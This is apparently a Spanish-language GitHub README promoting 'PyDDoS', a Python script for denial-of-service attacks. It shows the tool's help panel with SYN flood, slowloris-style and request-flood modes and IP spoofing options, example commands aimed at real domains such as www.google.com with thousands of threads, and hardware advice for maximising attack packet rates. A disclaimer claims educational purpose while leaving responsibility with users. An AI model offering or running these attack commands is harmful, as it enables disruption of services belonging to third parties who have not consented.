![68747470733a2f2f696d672e736869656c64732e696f2f62616467652f6c6963656e73652d47504c25323076332532422d626c75652e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d626430303030](https://user-images.githubusercontent.com/96842235/171992080-cb229833-74b1-4f32-8bb7-29dfa2a1ba37.svg) ![68747470733a2f2f696d672e736869656c64732e696f2f62616467652f626173682d342e322532422d626c75652e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d303064623030](https://user-images.githubusercontent.com/96842235/171992120-3013aece-0922-4562-8847-b410c70aafda.svg) ![68747470733a2f2f696d672e736869656c64732e696f2f646f636b65722f636c6f75642f6175746f6d617465642f763173317430723173683372332f616972676564646f6e2e7376673f7374796c653d666c61742d73717561726526636f6c6f72413d32373331333326636f6c6f72423d613961396139](https://user-images.githubusercontent.com/96842235/171992154-4d349752-1be6-4259-b504-5a235fda5411.svg)

![hfhf](https://user-images.githubusercontent.com/96842235/212391611-e8b058b0-b1f8-427f-ad48-d38945dd28b9.png)

# PyDDoS

### Script creado en python para hacer ataques DoS
Como bien prometi hace aproximadamente 2 semanas, cuando subi a mi github una herramienta llamada DoS, la cual dije que era una "beta" poco avanzada de lo que seria este script (De echo no tienen nada que ver), pero como el script era totalmente funcional decidi que seria algo positivo liberarlo. Puedes echarle un ojo [aqui](https://github.com/S3RGI09/DoS). Despues de estar varios dias pensando como puedo hacer un script mejor, me di cuenta que lo unico que tengo en la cabeza es un simple codigo de 9 lineas escrito en python, por lo que decidi buscar en foros, webs y un sin fin de mas cosas, hasta le pregunte a ChatGPT, pero despues de una recopilacion de ideas, decidi hacerlo. Me puse a programar como un loco y al final esto es lo que me salio.

### Inicio:
Lo primero que te sale al entrar en el script:
```
      _ \        __ \  __ \               ___|           _)       |                                                  
     |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|                                                
     ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |                                                  
    _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|                                                
           ____/                                            _|                                                       
                                                                                                                     
 DDoS python script | Script para ataques DDoS | Ataques DDoS                                                        
 Author: S3RGI09 (Sergio Casero Verdial)                                                                             
 Github: https://github.com/S3RGI09                                                                                  
 Version: 3.0                                                                                                        
                                                                                                                     
usage: ./pyddos -t [target] -p [port] -t [number threads]

options:
  -h, --help       show this help message and exit

options:

  -d <ip|domain>   Specify your target such an ip or domain name
  -t <float>       Set timeout for socket
  -T <int>         Set threads number for connection (default = 1000)
  -p <int>         Specify port target (default = 80) |Only required with pyslow attack|
  -s <int>         Set sleep time for reconnection
  -i <ip address>  Specify spoofed ip unless use fake ip
  -Request         Enable request target
  -Synflood        Enable synflood attack
  -Pyslow          Enable pyslow attack
  --fakeip         Option to create fake ip if not specify spoofed ip

Example:
    ./pyddos -d www.example.com -p 80 -T 2000 -Pyslow
    ./pyddos -d www.domain.com -s 100 -Request
    ./pyddos -d www.google.com -Synflood -T 5000 -t 10.0
```
Aqui te sale el panel de ayuda, el script esta diseñado para seguir un orden de comandos, lo que hace que sea mas rapido de usar, pero mas dificil de aprender. La causa de esto fue porque queria salir de lo que habia echo siempre (aparte que crear paneles de eleccion en python es jodidamente complicao).

### Ejemplos:
Abajo de todo tienes **ejemplos** lo cual te va a servir por si no te enteras de que hacer.

### Options:
Si quieres ordenes mas especificas tienes en el panel **options:** todas las opciones que puedes poner y las cosas que hace.
Una herramienta bastante buena y segura que no te dejara tirado.

### Recomendaciones: 
Para poder sacarle el mayor partido al script, utiliza una conexion por Ethernet, ya que con el Wi-Fi, aunque tengas al lado el router, suele perder potencia y velocidad, aparte de que podrias congestionar el canal del Wi-Fi, por lo que si tienes un cable Ethernet por ahi, recuerda que va a ser mejor. Usa un ordenador bueno, no intentes hacer estos ataques con una notebook del 2007 porque lo mas probable es que colapse, en su lugar, usa un ordenador capaz de hacer buen uso de los nucleos de la CPU, cuantos mas nucleos tenga, mas rapido se enviaran los paquetes, el script fue probado con una raspberry pi 4 4GB y va bastante bien 10http/seg, por lo que si no bajas de 4 nucleos, el ordenador funcionara con la CPU 100% 60http/seg. Utiliza una buena tarjeta de red, si es que tu ordenador es de gama alta, 12 nucleos 3.9Ghz pero tu tarjeta de red es mediocre, el ataque no va a ir tan bien que con una buena tarjeta de red, lo bueno es que en la actualidad, la mayoria de tarjetas de red, resisten a 120paquetes/seg

### Legal
Tengo que decir que como siempre tu eres el responsable de lo que haces, yo creo estas herramientas con fines educativos y no maliciosos. Te recuerdo que hacer ataques DOS a un computador de otra persona si su consentimiento es una actividad ilegal y las penas suelen ser muy serias dependiendo de las leyes de tu pais. Si quieres asumir el riesgo, adelante, pero primero se consciente de lo que vas a hacer y las consecuencias de ello. Lo que haces tu es culpa tuya, no mia, mi script es totalmente legal y tu eres el que recibira las consecuencias.

## Bugzilla
Si quieres depurar este script, te decimos como en este [link](https://bugzilla-s3rgi09.github.io/)

## Fin
Y ese es el script, gracias por usarlo!, posiblemente sea el script más abanzado que e echo sin copiarlo de otro, este, TssPentest y Scan.
